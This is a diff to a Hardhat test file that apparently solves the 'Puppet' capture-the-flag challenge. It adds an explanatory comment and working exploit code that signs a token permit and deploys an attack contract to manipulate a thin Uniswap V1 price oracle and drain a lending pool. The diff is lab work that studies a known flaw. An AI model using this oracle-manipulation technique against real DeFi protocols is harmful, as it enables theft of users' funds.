@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require("hardhat");
 const { expect } = require("chai");
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require("eth-permit");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(
@@ -111,31 +112,100 @@ describe("[Challenge] Puppet", function () {
     ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
   });
 
+  /**
+   *@dev
+   *Exploit Overview:
+   * PuppetPool : in order to borrow 1 DVT, require deposit 2 ETH as collateral
+   * The liquidity pool has a balance of 10 ETH : 10 DVT on UniswapV1 meant to be 50 : 50
+   * what we can do is trying to manipulate the liquidity pool price ratio on UniswapV1
+   * to lower DVT token price by depositing a huge amount of DVT tokens.
+   * then go back to puppet pool to borrow more DVT tokens and swap after uniswapV1 price resets
+   * */
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    const Attacker = await ethers.getContractFactory("AttackPuppet");
-    const attacker = await Attacker.deploy(
-      uniswapExchange.address,
-      lendingPool.address,
-      token.address,
+    // const Attacker = await ethers.getContractFactory("AttackPuppet");
+    // const attacker = await Attacker.deploy(
+    //   uniswapExchange.address,
+    //   lendingPool.address,
+    //   token.address,
+    //   player.address,
+    //   { value: ethers.utils.parseEther("15") }
+    // );
+    // console.log("Attacker @", attacker.address);
+    // let bal = await attacker.provider.getBalance(attacker.address);
+    // console.log(
+    //   "Attacker ETH balance before",
+    //   ethers.utils.formatEther(bal.toString())
+    // );
+    // await token
+    //   .connect(player)
+    //   .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    // bal = await token.balanceOf(attacker.address);
+    // console.log(
+    //   `Attacker token balance before `,
+    //   ethers.utils.formatEther(bal.toString())
+    // );
+    // await attacker.swap();
+    ////////////////////////////////////////////
+    // solution 2 :
+    // Connect to the contracts with attacker's account
+    // Connect to the contracts with the attackers wallet
+    const attackPool = lendingPool.connect(player);
+    const attackToken = token.connect(player);
+    const attackUniSwap = uniswapExchange.connect(player);
+
+    // Helper function to get current token/eth balances
+    const logAttackerBalances = async (address, name) => {
+      const ethBal = await ethers.provider.getBalance(address);
+      const tokenBal = await attackToken.balanceOf(address);
+
+      console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
+      console.log(
+        `TKN Balance of ${name}:`,
+        ethers.utils.formatEther(tokenBal)
+      );
+      console.log("");
+    };
+
+    await logAttackerBalances(player.address, "attacker");
+    await logAttackerBalances(attackUniSwap.address, "uniswap");
+
+    // Calculate contract address to generate signature
+    const contractAddr = ethers.utils.getContractAddress({
+      from: player.address,
+      nonce: await player.getTransactionCount(),
+    });
+    // Sign permit
+    const result = await signERC2612Permit(
+      player,
+      attackToken.address,
       player.address,
-      { value: ethers.utils.parseEther("15") }
+      contractAddr,
+      PLAYER_INITIAL_TOKEN_BALANCE
     );
-    console.log("Attacker @", attacker.address);
-    let bal = await attacker.provider.getBalance(attacker.address);
-    console.log(
-      "Attacker ETH balance before",
-      ethers.utils.formatEther(bal.toString())
+
+    console.log("Deploying attacking contract");
+    const AttackPuppetFactory = await ethers.getContractFactory(
+      "AttackPuppet",
+      player
     );
-    await token
-      .connect(player)
-      .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
-    bal = await token.balanceOf(attacker.address);
-    console.log(
-      `Attacker token balance before `,
-      ethers.utils.formatEther(bal.toString())
+    await AttackPuppetFactory.deploy(
+      PLAYER_INITIAL_TOKEN_BALANCE,
+      POOL_INITIAL_TOKEN_BALANCE,
+      result.deadline,
+      result.v,
+      result.r,
+      result.s,
+      attackUniSwap.address,
+      attackToken.address,
+      attackPool.address,
+      {
+        gasLimit: 1e7,
+        value: utils.parseEther("24"),
+      }
     );
-    await attacker.swap();
+
+    await logAttackerBalances(player.address, "Player");
   });
 
   after(async function () {
